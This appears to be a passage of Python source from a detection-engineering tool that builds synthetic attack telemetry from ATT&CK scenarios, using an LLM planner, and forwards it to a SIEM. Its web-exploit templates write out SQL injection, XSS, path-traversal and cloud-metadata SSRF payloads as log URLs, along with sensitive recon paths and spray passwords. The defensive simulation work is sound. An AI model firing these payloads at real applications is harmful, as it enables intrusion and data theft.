    {
        "id": "recon-to-webshell-persistence",
        "name": "Recon to Web Shell Persistence",
        "difficulty": "full_intrusion",
        "description": "External path discovery leads to public-app exploit canaries, tool transfer, signed-binary execution, and persistence.",
        "technique_ids": ["T1595", "T1190", "T1105", "T1218.011", "T1547.001", "T1053.005"],
        "preconditions": ["Web and WAF logs are parsed.", "Sysmon process and registry events are collected.", "Scheduled task events are collected."],
        "success_criteria": ["Detect sensitive path enumeration.", "Detect exploit-shaped upload/command attempts.", "Detect follow-on persistence activity."],
        "telemetry_sources": ["nginx", "waf", "sysmon", "windows_security"],
        "expected_detections": ["Recon path burst", "Suspicious web extension upload", "Ingress transfer", "Run key and scheduled task persistence"],
        "tags": ["web", "endpoint", "persistence"],
    },
    {
        "id": "valid-account-to-lsass",
        "name": "Valid Account to LSASS Access",
        "difficulty": "simple_chain",
        "description": "A valid account foothold progresses to command execution, internal discovery, and credential-access telemetry.",
        "technique_ids": ["T1078", "T1059.001", "T1046", "T1003.001"],
        "preconditions": ["Windows Security 4624 parsing is enabled.", "Sysmon process/access events are collected.", "Firewall traffic logs are available."],
        "success_criteria": ["Detect unusual valid-account logon.", "Detect post-logon discovery.", "Detect LSASS access by suspicious process."],
        "telemetry_sources": ["windows_security", "sysmon", "firewall"],
        "expected_detections": ["Valid account anomaly", "PowerShell discovery", "Internal sweep", "LSASS access"],
        "tags": ["identity", "credential-access", "endpoint"],
    },
    {
        "id": "password-spray-to-exfiltration",
        "name": "Password Spray to Exfiltration",
        "difficulty": "full_intrusion",
        "description": "Password spraying succeeds against a service account, followed by execution, transfer, C2, and outbound upload.",
        "technique_ids": ["T1110.001", "T1078", "T1059.001", "T1105", "T1071.004", "T1071.001", "T1041"],
        "preconditions": ["Windows auth events are collected.", "Endpoint and network telemetry are parsed.", "Proxy logs include bytes_out."],
        "success_criteria": ["Detect failure-to-success transition.", "Detect suspicious execution after logon.", "Detect C2 and large outbound transfer."],
        "telemetry_sources": ["windows_security", "sysmon", "dns", "edr", "proxy"],
        "expected_detections": ["Password spray", "Valid account success", "Ingress transfer", "DNS/TLS C2", "Large upload"],
        "tags": ["identity", "c2", "exfiltration"],
    },
    {
        "id": "xss-to-session-abuse",
        "name": "XSS Canary to Session Abuse",
        "difficulty": "simple_chain",
        "description": "Web exploit canaries are followed by valid-account use and endpoint discovery, modelling session or credential abuse without executing browser code.",
        "technique_ids": ["T1190", "T1078", "T1059.001", "T1046"],
        "preconditions": ["WAF/web logs are parsed.", "Windows Security events are available.", "Endpoint process telemetry is available."],
        "success_criteria": ["Detect XSS-shaped requests.", "Detect unusual valid-account logon.", "Detect discovery after the web event cluster."],
        "telemetry_sources": ["waf", "windows_security", "sysmon", "firewall"],
        "expected_detections": ["XSS canary", "Valid-account use", "Command execution", "Internal discovery"],
        "tags": ["web", "identity", "endpoint"],
    },
    {
        "id": "ssrf-metadata-to-c2",
        "name": "SSRF Metadata Probe to C2",
        "difficulty": "full_intrusion",
        "description": "SSRF-shaped web probes are correlated with ingress transfer, DNS resolution, and outbound C2 telemetry.",
        "technique_ids": ["T1595", "T1190", "T1105", "T1071.004", "T1071.001"],
        "preconditions": ["WAF canary classifications are parsed.", "DNS logs are available.", "EDR network events are collected."],
        "success_criteria": ["Detect metadata-service probe.", "Detect staging transfer.", "Detect suspicious DNS and outbound TLS from the staged process."],
        "telemetry_sources": ["nginx", "waf", "sysmon", "dns", "edr"],
        "expected_detections": ["SSRF metadata canary", "Ingress transfer", "Beacon DNS", "Outbound network connection"],
        "tags": ["web", "cloud-adjacent", "c2"],
    },
    {
        "id": "ransomware-precursor",
        "name": "Ransomware Precursor Chain",
        "difficulty": "full_intrusion",
        "description": "Credential access and persistence signals are staged after initial foothold, with exfiltration-like traffic before impact.",
        "technique_ids": ["T1110.001", "T1078", "T1059.001", "T1003.001", "T1547.001", "T1053.005", "T1041"],
        "preconditions": ["Auth, Sysmon, and proxy logs are parsed.", "Credential-access and persistence detections are enabled.", "Run correlation is enabled."],
        "success_criteria": ["Detect account compromise.", "Detect credential dumping and persistence.", "Detect pre-impact outbound data movement."],
        "telemetry_sources": ["windows_security", "sysmon", "proxy"],
        "expected_detections": ["Password spray success", "LSASS access", "Run key", "Scheduled task", "Outbound upload"],
        "tags": ["ransomware", "credential-access", "persistence", "exfiltration"],
    },
    {
        "id": "living-off-the-land-transfer",
        "name": "Living-off-the-Land Transfer and Execution",
        "difficulty": "simple_chain",
        "description": "Native Windows utilities perform staging and execution, followed by suspicious outbound network activity.",
        "technique_ids": ["T1059.001", "T1105", "T1218.011", "T1071.001"],
        "preconditions": ["Sysmon process-create events are collected.", "EDR network connection telemetry is parsed.", "Command-line fields are searchable."],
        "success_criteria": ["Detect encoded PowerShell.", "Detect certutil/BITS transfer.", "Detect signed binary proxy execution and outbound connection."],
        "telemetry_sources": ["sysmon", "edr"],
        "expected_detections": ["Encoded PowerShell", "Certutil/BITS download", "Rundll32/mshtml", "Beacon network connection"],
        "tags": ["endpoint", "lolbin", "c2"],
    },
    {
        "id": "internal-discovery-after-foothold",
        "name": "Internal Discovery After Foothold",
        "difficulty": "simple_chain",
        "description": "A valid account foothold performs local command discovery and then scans internal ports.",
        "technique_ids": ["T1078", "T1059.001", "T1046"],
        "preconditions": ["Successful logon events are collected.", "Command execution telemetry is available.", "Firewall/traffic logs are parsed."],
        "success_criteria": ["Detect unusual logon.", "Detect host/network discovery commands.", "Detect many destination ports from one source."],
        "telemetry_sources": ["windows_security", "sysmon", "firewall"],
        "expected_detections": ["4624 unusual source", "Discovery command chain", "Internal port sweep"],
        "tags": ["identity", "discovery"],
    },
    {
        "id": "web-enumeration-to-password-spray",
        "name": "Web Enumeration to Password Spray",
        "difficulty": "simple_chain",
        "description": "Public username enumeration is followed by password spraying and a success event.",
        "technique_ids": ["T1589.002", "T1110.001", "T1078"],
        "preconditions": ["Application auth telemetry is parsed.", "Windows auth events are parsed.", "User fields are normalized or searchable."],
        "success_criteria": ["Detect username response differential.", "Detect many failed logons from one source.", "Detect success after failures."],
        "telemetry_sources": ["application_auth", "windows_security"],
        "expected_detections": ["User enumeration", "4625 burst", "4624 after failures"],
        "tags": ["identity", "web"],
    },
    {
        "id": "public-app-to-persistence",
        "name": "Public App Exploit to Persistence",
        "difficulty": "full_intrusion",
        "description": "Public-app exploitation is followed by execution, transfer, and two persistence mechanisms.",
        "technique_ids": ["T1190", "T1059.001", "T1105", "T1547.001", "T1053.005"],
        "preconditions": ["WAF logs are parsed.", "Sysmon process/registry events are collected.", "Windows task creation events are available."],
        "success_criteria": ["Detect exploit-shaped web request.", "Detect staged payload transfer.", "Detect both persistence mechanisms."],
        "telemetry_sources": ["waf", "sysmon", "windows_security"],
        "expected_detections": ["WAF canary", "PowerShell download cradle", "Run key", "Scheduled task"],
        "tags": ["web", "endpoint", "persistence"],
    },
    {
        "id": "credential-dump-to-cloud-upload",
        "name": "Credential Dump to Cloud Upload",
        "difficulty": "full_intrusion",
        "description": "Endpoint execution leads to LSASS access, DNS/C2, and upload to an external file service.",
        "technique_ids": ["T1059.001", "T1003.001", "T1071.004", "T1071.001", "T1567.002"],
        "preconditions": ["Sysmon process/access events are collected.", "DNS and EDR network events are parsed.", "Proxy upload fields are available."],
        "success_criteria": ["Detect LSASS access.", "Detect suspicious DNS/outbound C2.", "Detect cloud-service upload after credential access."],
        "telemetry_sources": ["sysmon", "dns", "edr", "proxy"],
        "expected_detections": ["Credential dumping", "Beacon DNS", "Outbound C2", "Cloud upload"],
        "tags": ["credential-access", "c2", "exfiltration"],
    },
    {
        "id": "defense-evasion-to-c2",
        "name": "Signed Binary Proxy to C2",
        "difficulty": "simple_chain",
        "description": "Signed binary proxy execution is followed by DNS and outbound C2 connection telemetry.",
        "technique_ids": ["T1218.011", "T1071.004", "T1071.001"],
        "preconditions": ["Sysmon process-create is collected.", "DNS telemetry is collected.", "EDR network events are parsed."],
        "success_criteria": ["Detect rundll32/mshtml pattern.", "Detect rare DNS lookups.", "Detect outbound connection from staged process."],
        "telemetry_sources": ["sysmon", "dns", "edr"],
        "expected_detections": ["Signed binary proxy execution", "Suspicious DNS", "Outbound TLS"],
        "tags": ["defense-evasion", "c2"],
    },
    {
        "id": "fin7-style-web-identity-persistence",
        "name": "FIN7-Style Web, Identity, Persistence",
        "difficulty": "full_intrusion",
        "description": "A web and credential-driven intrusion chain with persistence and credential-access telemetry.",
        "technique_ids": ["T1190", "T1110.001", "T1078", "T1059.001", "T1105", "T1053.005", "T1003.001"],
        "preconditions": ["WAF, Windows Security, and Sysmon events are available.", "Scheduled task detections are enabled.", "SIEM can correlate by run_id."],
        "success_criteria": ["Detect public exploit canaries.", "Detect credential attack and valid-account success.", "Detect persistence and LSASS access."],
        "telemetry_sources": ["waf", "windows_security", "sysmon"],
        "expected_detections": ["Web exploit", "Password spray", "Valid account", "Scheduled task", "LSASS access"],
        "tags": ["fin7-style", "web", "identity", "persistence"],
    },
    {
        "id": "apt29-style-identity-powershell",
        "name": "APT29-Style Identity and PowerShell",
        "difficulty": "full_intrusion",
        "description": "Identity foothold followed by PowerShell execution, ingress transfer, DNS C2, and exfiltration-shaped proxy telemetry.",
        "technique_ids": ["T1078", "T1059.001", "T1105", "T1071.004", "T1071.001", "T1041"],
        "preconditions": ["Windows Security events are parsed.", "PowerShell/Sysmon process events are available.", "DNS/EDR/proxy logs are parsed."],
        "success_criteria": ["Detect valid-account foothold.", "Detect PowerShell staging.", "Detect C2 and exfiltration sequence."],
        "telemetry_sources": ["windows_security", "sysmon", "dns", "edr", "proxy"],
        "expected_detections": ["Valid account", "PowerShell execution", "Ingress transfer", "DNS/TLS C2", "Outbound upload"],
        "tags": ["apt29-style", "identity", "powershell", "exfiltration"],
    },
    {
        "id": "lazarus-style-delivery-exfil",
        "name": "Lazarus-Style Delivery and Exfiltration",
        "difficulty": "full_intrusion",
        "description": "Execution and staging activity followed by persistence, C2, and exfiltration-shaped telemetry.",
        "technique_ids": ["T1059.001", "T1105", "T1218.011", "T1547.001", "T1071.004", "T1071.001", "T1041"],
        "preconditions": ["Sysmon process and registry telemetry is collected.", "DNS/EDR/proxy logs are parsed.", "Correlation by host and run_id is enabled."],
        "success_criteria": ["Detect execution and staging.", "Detect persistence.", "Detect C2 and outbound upload."],
        "telemetry_sources": ["sysmon", "dns", "edr", "proxy"],
        "expected_detections": ["PowerShell execution", "Ingress transfer", "Rundll32 proxy execution", "Run key", "C2", "Exfiltration"],
        "tags": ["lazarus-style", "endpoint", "persistence", "exfiltration"],
    },
    {
        "id": "noisy-red-team-drill",
        "name": "Noisy Red-Team Drill",
        "difficulty": "noisy_red_team_drill",
        "description": "A broad, noisy validation run that touches web, auth, endpoint, network, C2, credential access, persistence, and exfiltration controls.",
        "technique_ids": ASSISTANT_COMPLICATED_CHALLENGE_TTPS,
        "preconditions": ["All major telemetry sources are enabled.", "SIEM ingestion rate can handle burst delivery.", "Rules are enabled but tuned for lab run_id correlation."],
        "success_criteria": ["Detect every major phase.", "Do not collapse all alerts into one undifferentiated incident.", "Preserve raw vendor/source fields for each event family."],
        "telemetry_sources": ["nginx", "waf", "application_auth", "windows_security", "sysmon", "firewall", "dns", "edr", "proxy"],
        "expected_detections": ["Recon", "Exploit", "Credential attack", "Execution", "Discovery", "C2", "Credential access", "Persistence", "Exfiltration"],
        "tags": ["full-chain", "noisy", "validation"],
    },
    {
        "id": "stealthy-low-volume-chain",
        "name": "Stealthy Low-Volume Intrusion Chain",
        "difficulty": "full_intrusion",
        "description": "A lower-volume chain focused on correlation quality rather than event volume: valid account, execution, DNS C2, credential access, and exfiltration.",
        "technique_ids": ["T1078", "T1059.001", "T1071.004", "T1071.001", "T1003.001", "T1567.002"],
        "preconditions": ["Identity, endpoint, DNS, EDR, and proxy telemetry is available.", "Correlation rules are not dependent on high event volume only."],
        "success_criteria": ["Detect suspicious sequence with few events.", "Correlate identity and endpoint activity.", "Detect exfiltration after credential access."],
        "telemetry_sources": ["windows_security", "sysmon", "dns", "edr", "proxy"],
        "expected_detections": ["Valid account", "Execution", "DNS C2", "Credential access", "Cloud upload"],
        "tags": ["stealthy", "correlation", "exfiltration"],
    },
    {
        "id": "waf-bypass-retry-chain",
        "name": "WAF Bypass Retry Chain",
        "difficulty": "simple_chain",
        "description": "Repeated encoded public-app exploit attempts are followed by staging and outbound communication signals.",
        "technique_ids": ["T1595", "T1190", "T1105", "T1071.001"],
        "preconditions": ["Web and WAF logs preserve encoded URI fields.", "Endpoint process and EDR network events are collected."],
        "success_criteria": ["Detect encoded exploit retries.", "Detect transition from web activity to host staging.", "Detect outbound connection from staged tool."],
        "telemetry_sources": ["nginx", "waf", "sysmon", "edr"],
        "expected_detections": ["Double-encoded SQLi retry", "WAF canary", "Ingress transfer", "Outbound network connection"],
        "tags": ["web", "waf", "c2"],
    },
    {
        "id": "service-account-abuse",
        "name": "Service Account Abuse",
        "difficulty": "simple_chain",
        "description": "Password attack activity succeeds against a service account and is followed by execution, discovery, and persistence.",
        "technique_ids": ["T1110.001", "T1078", "T1059.001", "T1046", "T1547.001"],
        "preconditions": ["Service-account logons are visible.", "Sysmon and firewall logs are parsed.", "Service-account baselines exist."],
        "success_criteria": ["Detect service account failure-to-success.", "Detect interactive-like activity from service account.", "Detect persistence after service account use."],
        "telemetry_sources": ["windows_security", "sysmon", "firewall"],
        "expected_detections": ["4625/4624 service account sequence", "PowerShell discovery", "Internal sweep", "Run key persistence"],
        "tags": ["identity", "service-account", "persistence"],
    },
    {
        "id": "external-recon-to-credential-access",
        "name": "External Recon to Credential Access",
        "difficulty": "full_intrusion",
        "description": "External recon and public exploit attempts are correlated to endpoint execution and credential-access telemetry.",
        "technique_ids": ["T1595", "T1190", "T1059.001", "T1105", "T1003.001"],
        "preconditions": ["Web/WAF and endpoint telemetry are available.", "SIEM can correlate scenario run_id across source families."],
        "success_criteria": ["Detect recon and exploit canaries.", "Detect staging and command execution.", "Detect LSASS access."],
        "telemetry_sources": ["nginx", "waf", "sysmon"],
        "expected_detections": ["Recon burst", "Exploit canary", "PowerShell execution", "Ingress transfer", "Credential dumping"],
        "tags": ["web", "endpoint", "credential-access"],
    },
    {
        "id": "c2-only-validation",
        "name": "C2 Telemetry Validation",
        "difficulty": "atomic_chain",
        "description": "A compact C2-focused run for validating DNS and outbound network detections without a full intrusion story.",
        "technique_ids": ["T1071.004", "T1071.001"],
        "preconditions": ["DNS logs are collected.", "EDR network telemetry is parsed.", "Destination rarity detections are enabled."],
        "success_criteria": ["Detect suspicious DNS queries.", "Detect outbound connection from suspicious process.", "Correlate DNS and network event by host/time."],
        "telemetry_sources": ["dns", "edr"],
        "expected_detections": ["Beacon-like DNS", "Outbound TLS from staged binary"],
        "tags": ["c2", "atomic-chain"],
    },
    {
        "id": "persistence-validation",
        "name": "Persistence Control Validation",
        "difficulty": "atomic_chain",
        "description": "A compact persistence-focused run for validating Run key and scheduled-task detections.",
        "technique_ids": ["T1547.001", "T1053.005"],
        "preconditions": ["Sysmon registry events are collected.", "Windows scheduled task events are collected.", "Persistence rules are enabled."],
        "success_criteria": ["Detect Run key creation.", "Detect scheduled task creation.", "Preserve user, host, target object, and task content fields."],
        "telemetry_sources": ["sysmon", "windows_security"],
        "expected_detections": ["Run key persistence", "Suspicious scheduled task"],
        "tags": ["persistence", "atomic-chain"],
    },
]


async def run_ai_assistant_telemetry_simulation(
    mode: str,
    ai_provider: str,
    complicated_attack: bool,
    technique_ids: list[str],
    actor_profile: str,
    analyst_goal: str,
    destination_url: str,
    auth_type: str = "none",
    username: str = "",
    password: str = "",
    token: str = "",
    header_name: str = "",
    connection_mode: str = "auto",
    allow_http_fallback: bool = True,
    payload_format: str = "per_event",
    scenario_id: str = "",
) -> dict[str, Any]:
    if mode not in {"ttps", "actor", "challenge"}:
        raise ValueError("Unknown AI assistant mode")
    if ai_provider not in {"local", "claude", "openai", "gemini", "minimax"}:
        raise ValueError("Unknown AI provider")
    scenario = _assistant_scenario_by_id(scenario_id)
    selected = list(scenario["technique_ids"]) if scenario else _assistant_selected_ttps(mode, technique_ids, actor_profile, analyst_goal, complicated_attack)
    ai_plan = await _assistant_llm_plan(
        provider=ai_provider,
        mode=mode,
        complicated_attack=complicated_attack,
        initial_technique_ids=selected,
        actor_profile=actor_profile,
        analyst_goal=_assistant_goal_with_scenario(analyst_goal, scenario),
    )
    if ai_plan.get("technique_ids") and not scenario:
        planned = [item for item in ai_plan["technique_ids"] if re.match(r"^T\d{4}(?:\.\d{3})?$", item)]
        if complicated_attack and mode == "challenge":
            selected = _assistant_coherent_complicated_chain(planned)
        else:
            selected = planned[:18] or selected
    run_id = f"run-{uuid4()}"
    events: list[dict[str, Any]] = []
    for ttp in selected:
        templates = _assistant_complicated_templates_for_ttp(ttp) if complicated_attack else _assistant_templates_for_ttp(ttp)
        for template in templates:
            events.append(_assistant_event_for_ttp(ttp, run_id, len(events) + 1, mode, actor_profile, analyst_goal, template, ai_provider, complicated_attack))
    attack_plan = _assistant_attack_plan(events, mode, actor_profile, analyst_goal, ai_provider, complicated_attack)
    for event in events:
        _append_jsonl(_endpoint_jsonl_path(), event)
        _append_text_line(_endpoint_log_path(), event["raw_line"])
        _append_jsonl(_attack_log_path(run_id), event)
    summary = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "event_type": "ai_assistant_attack_summary",
        "run_id": run_id,
        "simulation_id": "ai-assistant-attack-simulation",
        "ai_provider": ai_provider,
        "complicated_attack": complicated_attack,
        "technique_ids": selected,
        "message": attack_plan["summary"],
        "scenario_id": scenario["id"] if scenario else "",
        "events_generated": len(events),
    }
    _append_jsonl(_attack_log_path(run_id), summary)
    logs = {
        "source": "endpoint",
        "run_id": run_id,
        "log_file": str(_endpoint_log_path()),
        "line_count": len(events),
        "events": events,
        "returned_at": datetime.now(timezone.utc).isoformat(),
    }
    destination = _validate_siem_destination(destination_url, connection_mode=connection_mode)
    headers = {
        "Content-Type": "text/plain; charset=utf-8" if (complicated_attack or payload_format == "raw_lines") else "application/json",
        "User-Agent": "AdversaryGraph-AI-AttackAssistant/1.0",
        "X-AdversaryGraph-Module": "attack-simulation-ai-assistant",
        "X-AdversaryGraph-Run-Id": run_id,
        "X-Xpolog-Sender": "adversarygraph-ai-attack-assistant",
    }
    headers.update(_siem_auth_headers(auth_type, username=username, password=password, token=token, header_name=header_name))
    started = time.perf_counter()
    if payload_format not in {"raw_lines", "per_event", "json_lines", "envelope"}:
        raise ValueError("Unsupported SIEM payload format")
    effective_payload_format = "raw_lines" if complicated_attack else payload_format
    if effective_payload_format in {"raw_lines", "per_event"}:
        delivery = _forward_siem_events_individually(
            destination=destination,
            logs=logs,
            headers=headers,
            started=started,
            original_destination=destination_url,
            connection_mode=connection_mode,
            allow_http_fallback=allow_http_fallback,
            payload_format=effective_payload_format,
        )
    else:
        body = _siem_payload_body(logs, effective_payload_format)
        delivery, fallback_note = _post_siem_payload(
            destination=destination,
            body=body,
            headers=headers,
            started=started,
            original_destination=destination_url,
            connection_mode=connection_mode,
            allow_http_fallback=allow_http_fallback,
        )
        delivery.update(
            {
                "source": "endpoint",
                "run_id": run_id,
                "event_count": len(events),
                "duration_ms": round((time.perf_counter() - started) * 1000, 3),
                "http_fallback_used": bool(fallback_note),
                "fallback_note": fallback_note,
                "payload_format": effective_payload_format,
                "sent_event_count": len(events) if delivery.get("ok") else 0,
            }
        )
    return {
        "run_id": run_id,
        "mode": mode,
        "ai_provider": ai_provider,
        "ai_model": ai_plan.get("model", ""),
        "ai_used": bool(ai_plan.get("used")),
        "ai_error": str(ai_plan.get("error") or ""),
        "ai_planner_summary": str(ai_plan.get("summary") or ""),
        "scenario": scenario,
        "complicated_attack": complicated_attack,
        "actor_profile": actor_profile,
        "technique_ids": selected,
        "attack_plan": attack_plan,
        "events": events,
        "delivery": delivery,
        "log_file": str(_endpoint_log_path()),
    }


def _assistant_selected_ttps(mode: str, technique_ids: list[str], actor_profile: str, analyst_goal: str, complicated_attack: bool = False) -> list[str]:
    cleaned = []
    for item in technique_ids:
        value = item.strip().upper()
        if value and re.match(r"^T\d{4}(?:\.\d{3})?$", value) and value not in cleaned:
            cleaned.append(value)
    if mode == "ttps" and cleaned:
        return cleaned[:12]
    if mode == "actor":
        return ASSISTANT_ACTOR_TTPS.get(actor_profile, ASSISTANT_ACTOR_TTPS["generic-intrusion"])
    if mode == "challenge" and complicated_attack:
        return list(ASSISTANT_COMPLICATED_CHALLENGE_TTPS)
    if "complicated" in analyst_goal.lower() or "multi-source" in analyst_goal.lower() or "many" in analyst_goal.lower():
        return list(ASSISTANT_COMPLICATED_CHALLENGE_TTPS)
    seed = hashlib.sha256(f"{actor_profile}|{analyst_goal}|{datetime.now(timezone.utc).date()}".encode("utf-8")).hexdigest()
    rng = random.Random(seed)
    pool = ["T1595", "T1190", "T1110.001", "T1078", "T1059.001", "T1105", "T1003.001", "T1547.001", "T1053.005", "T1218.011", "T1041", "T1567.002"]
    rng.shuffle(pool)
    return pool[: rng.randint(6, 9)]


def _assistant_coherent_complicated_chain(planned: list[str]) -> list[str]:
    """Keep complicated challenge output as a plausible ordered kill chain.

    The LLM may suggest extra ATT&CK IDs, but the simulator must not become a
    random bag of phases. Known phases are ordered by the validated scenario;
    unsupported extras are ignored because there is no source-realistic event
    template for them yet.
    """
    allowed = set(ASSISTANT_COMPLICATED_CHALLENGE_TTPS)
    merged = [item for item in ASSISTANT_COMPLICATED_CHALLENGE_TTPS]
    for item in planned:
        if item in allowed and item not in merged:
            merged.append(item)
    return merged


def list_ai_assistant_scenarios() -> list[dict[str, Any]]:
    return [dict(item) for item in ASSISTANT_SCENARIOS]


def _assistant_scenario_by_id(scenario_id: str) -> dict[str, Any] | None:
    if not scenario_id:
        return None
    for item in ASSISTANT_SCENARIOS:
        if item["id"] == scenario_id:
            return dict(item)
    raise ValueError("Unknown AI assistant scenario")


def _assistant_goal_with_scenario(analyst_goal: str, scenario: dict[str, Any] | None) -> str:
    if not scenario:
        return analyst_goal
    return (
        f"Scenario: {scenario['name']}. {scenario['description']} "
        f"Preconditions: {'; '.join(scenario['preconditions'])}. "
        f"Success criteria: {'; '.join(scenario['success_criteria'])}. "
        f"Analyst goal: {analyst_goal}"
    )


async def _assistant_llm_plan(
    provider: str,
    mode: str,
    complicated_attack: bool,
    initial_technique_ids: list[str],
    actor_profile: str,
    analyst_goal: str,
) -> dict[str, Any]:
    system = (
        "You are an expert detection engineering exercise designer. "
        "Return only JSON. Design a defensive SIEM telemetry simulation plan, not exploit instructions. "
        "Use ATT&CK technique IDs only. Prefer diverse telemetry: web, WAF, auth, Windows Security, Sysmon, EDR, firewall, DNS, proxy."
    )
    user = json.dumps(
        {
            "task": "Select ATT&CK techniques for a realistic attack telemetry simulation.",
            "mode": mode,
            "complicated_attack": complicated_attack,
            "actor_profile": actor_profile,
            "analyst_goal": analyst_goal,
            "initial_technique_ids": initial_technique_ids,
            "required_output_schema": {
                "summary": "one sentence",
                "technique_ids": ["T1595", "T1190"],
                "phases": [{"name": "recon", "technique_id": "T1595", "telemetry_sources": ["nginx"]}],
            },
            "rules": [
                "For complicated_attack=true, return 10-16 technique IDs.",
                "Include high-volume recon, public web exploit attempts, user enumeration or brute force, valid account, execution, credential access, transfer, persistence, C2, and exfiltration where appropriate.",
                "Do not include instructions to exploit real systems.",
            ],
        },
        sort_keys=True,
    )
    try:
        adapter = get_adapter(provider)
        raw = await asyncio.wait_for(adapter._raw_complete(system, user), timeout=_AI_ATTACK_PLANNER_TIMEOUT_SECONDS)
        text = raw.strip()
        text = re.sub(r"^```(?:json)?\s*", "", text, flags=re.MULTILINE)
        text = re.sub(r"\s*```$", "", text, flags=re.MULTILINE)
        try:
            data = json.loads(text)
        except json.JSONDecodeError:
            start = text.index("{")
            data, _ = json.JSONDecoder().raw_decode(text, start)
        technique_ids: list[str] = []
        for value in data.get("technique_ids", []):
            item = str(value).upper().strip()
            if re.match(r"^T\d{4}(?:\.\d{3})?$", item) and item not in technique_ids:
                technique_ids.append(item)
        return {
            "used": True,
            "provider": adapter.provider,
            "model": adapter.model,
            "summary": str(data.get("summary") or ""),
            "technique_ids": technique_ids,
            "raw": raw[:4000],
        }
    except asyncio.TimeoutError:
        error = f"AI planner timed out after {_AI_ATTACK_PLANNER_TIMEOUT_SECONDS:g}s"
        logger.warning("AI attack assistant planning failed for provider %s: %s", provider, error)
        return {
            "used": False,
            "provider": provider,
            "model": "",
            "summary": "",
            "technique_ids": [],
            "error": error,
        }
    except Exception as exc:
        logger.warning("AI attack assistant planning failed for provider %s: %s", provider, exc)
        return {
            "used": False,
            "provider": provider,
            "model": "",
            "summary": "",
            "technique_ids": [],
            "error": str(exc),
        }


def _assistant_event_for_ttp(
    technique_id: str,
    run_id: str,
    index: int,
    mode: str,
    actor_profile: str,
    analyst_goal: str,
    template: dict[str, Any],
    ai_provider: str,
    complicated_attack: bool,
) -> dict[str, Any]:
    timestamp = datetime.now(timezone.utc).isoformat()
    base = {
        "timestamp": timestamp,
        "run_id": run_id,
        "simulation_id": "ai-assistant-attack-simulation",
        "event_type": "ai_assistant_generated_detection_event",
        "technique_id": technique_id,
        "sequence": index,
        "mode": mode,
        "ai_provider": ai_provider,
        "complicated_attack": complicated_attack,
        "actor_profile": actor_profile or "challenge",
        "analyst_goal": analyst_goal[:500],
        "host": "WIN-ATTACK-LAB-01",
        "user": "LAB\\alice",
        "source": "endpoint",
        "product": "AdversaryGraph",
    }
    event = {**base, **template}
    event["raw_line"] = _assistant_vendor_raw_line(event) if complicated_attack else json.dumps(_assistant_siem_event_shape(event), sort_keys=True)
    event["message"] = event["raw_line"]
    return event


def _assistant_templates_for_ttp(technique_id: str) -> list[dict[str, Any]]:
    if technique_id.startswith("T1595"):
        paths = ["/", "/robots.txt", "/.git/config", "/.env", "/admin", "/wp-login.php", "/phpmyadmin", "/server-status", "/actuator/env", "/api/v1/users", "/backup.zip", "/owa/auth/logon.aspx"]
        return [
            {
                "provider": "nginx",
                "event_id": "AG-WEB-1595",
                "event_name": "ActiveScanning",
                "severity": "medium" if index < 6 else "high",
                "src_ip": "198.51.100.77",
                "url": path,
                "http_method": "GET" if path != "/" else "HEAD",
                "status": 200 if path in {"/", "/robots.txt"} else 404,
                "user_agent": ["curl/8.1.2", "python-requests/2.31", "sqlmap/1.7", "Nmap Scripting Engine"][index % 4],
                "rule_name": "Reconnaissance path enumeration and tool fingerprinting",
                "detection_focus": ["path diversity", "tool user-agent", "404 burst", "sensitive path"],
                "flow_stage": "reconnaissance",
                "request_index": index + 1,
            }
            for index, path in enumerate(paths)
        ]
    if technique_id.startswith("T1190"):
        payloads = [
            ("GET", "/search?q=%27%20OR%20%271%27%3D%271--", "SQL injection boolean probe", "sqli"),
            ("GET", "/search?q=%27%20UNION%20SELECT%20user,password%20FROM%20users--", "SQL injection UNION probe", "sqli"),
            ("GET", "/product?id=1%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--", "SQL injection time delay probe", "sqli"),
            ("GET", "/login?next=%3Cscript%3Ealert(1)%3C/script%3E", "Reflected XSS script probe", "xss"),
            ("GET", "/profile?name=%3Cimg%20src=x%20onerror=alert(1)%3E", "Reflected XSS event handler probe", "xss"),
            ("POST", "/api/search", "JSON SQLi body probe", "sqli"),
            ("GET", "/download?file=..%2F..%2F..%2Fetc%2Fpasswd", "Path traversal probe", "path_traversal"),
            ("GET", "/fetch?url=http://169.254.169.254/latest/meta-data/", "SSRF metadata probe", "ssrf"),
            ("POST", "/upload/shell.php", "Suspicious web extension upload", "webshell"),
            ("POST", "/admin/exec", "Command injection shaped body", "command_injection"),
            ("GET", "/search?q=%2527%2520OR%25201%253D1--", "Double encoded SQLi retry", "sqli"),
            ("GET", "/comment?body=javascript:alert(document.domain)", "JavaScript URI XSS probe", "xss"),
        ]
        events = []
        for index, (method, url, name, canary) in enumerate(payloads):
            events.append(
                {
                    "provider": "waf",
                    "event_id": "AG-WAF-1190",
                    "event_name": "ExploitPublicFacingApplication",
                    "severity": "high",
                    "src_ip": "203.0.113.45",
                    "url": url,
                    "http_method": method,
                    "status": 403 if index != 5 else 500,
                    "request_body_sha256": hashlib.sha256(f"{method}:{url}:{name}".encode("utf-8")).hexdigest(),
                    "rule_name": name,
                    "canary_classification": canary,
                    "detection_focus": ["payload family", "blocked request", "response anomaly", "same source correlation"],
                    "flow_stage": "public_app_exploitation",
                    "request_index": index + 1,
                }
            )
        return events
    if technique_id.startswith("T1110") or technique_id == "T1110":
        users = ["admin", "administrator", "svc-backup", "svc-deploy", "jsmith", "mcohen", "orlevy", "backup", "root", "helpdesk"]
        events = []
        for round_id, password_name in enumerate(["Summer2026!", "Password1!", "Welcome2026!"]):
            for user_index, target_user in enumerate(users):
                events.append(
                    {
                        "provider": "windows_security",
                        "event_id": "4625",
                        "event_name": "FailedLogon",
                        "severity": "high" if round_id > 0 else "medium",
                        "logon_type": "3",
                        "target_user": target_user,
                        "src_ip": "10.20.30.44",
                        "failure_reason": "Bad password",
                        "sub_status": "0xC000006A",
                        "password_pattern": f"candidate-{round_id + 1}",
                        "rule_name": "Password spraying or brute-force failure flow",
                        "detection_focus": ["4625 burst", "many users", "shared password candidate", "single source"],
                        "flow_stage": "credential_attack",
                        "request_index": round_id * len(users) + user_index + 1,
                    }
                )
        events.append(
            {
                "provider": "windows_security",
                "event_id": "4624",
                "event_name": "SuccessfulLogon",
                "severity": "critical",
                "logon_type": "3",
                "target_user": "svc-backup",
                "src_ip": "10.20.30.44",
                "rule_name": "Successful logon after password spray failures",
                "detection_focus": ["4624 after 4625 burst", "service account", "same source IP"],
                "flow_stage": "credential_attack_success",
                "request_index": len(events) + 1,
            }
        )
        return events
    if technique_id.startswith("T1589"):
